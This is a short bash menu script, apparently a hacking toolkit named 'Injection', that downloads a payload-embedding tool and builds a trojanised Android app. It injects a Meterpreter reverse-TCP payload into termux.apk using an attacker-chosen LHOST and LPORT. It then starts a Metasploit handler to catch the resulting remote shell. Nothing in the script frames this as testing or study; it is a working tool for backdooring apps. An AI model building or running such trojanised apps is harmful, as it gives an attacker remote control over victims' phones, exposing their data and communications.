#!/bin/bash
clear
#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
figlet  -f big "           Injection  "
#--------------------------------
#--------------------------------
#--------------------------------
echo ""
echo -e $cyan        "[1] Download embed-payload"
echo -e $cyan        "[2] Payload android"
echo -e $cyan        "[3] android penetration"
echo -e $cyan        "[4] exit"
echo ""
read -p"  number----------->" Zoal
echo ""
if [ $Zoal -eq 1 ]
then
read -p $p----------->please waite<---------------$p
git clone https://github.com/xc0d3rz/metasploit-apk-embed-payload
clear
cd metasploit-apk-embed-payload && cd v0.2 && chmod +x apk-embed-payload.rb
cd Tools && cd signapk && chmod +x *
cd .. && cd ..
clear
cd lib && chmod +x *
cd $HOME/Pay-Andro
bash injec.sh
fi
if [ $Zoal -eq 2 ]
then
echo -e $p    "Welcome To In Injection"
echo ""
echo -e $yellow "Please Insert Name apk :>"
echo ""
read -p                          "Name======>" Name
echo ""
echo -e $yellow "Please Insert LHOST :>"
echo ""
read -p                           "LHOST======>" host
echo ""
echo -e $yellow "Please Insert LPORT :>"
echo ""
read -p                           "LPORT======>" port
ruby apk-embed-payload.rb termux.apk -p android/meterpreter/reverce_tcp LHOST=$host LPORT=$port -o zoal.apk
sleep 2
echo -e $red "Done"
read -p "press [Enter] key to continue..."
readEnterKey
bash injec.sh
fi
if [ $Zoal -eq 3 ]
then
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST localhost' -x 'set LPORT 4444' -x 'run'
fi
if [ $Zoal -eq 4 ]
then
figlet "god bye"
fi
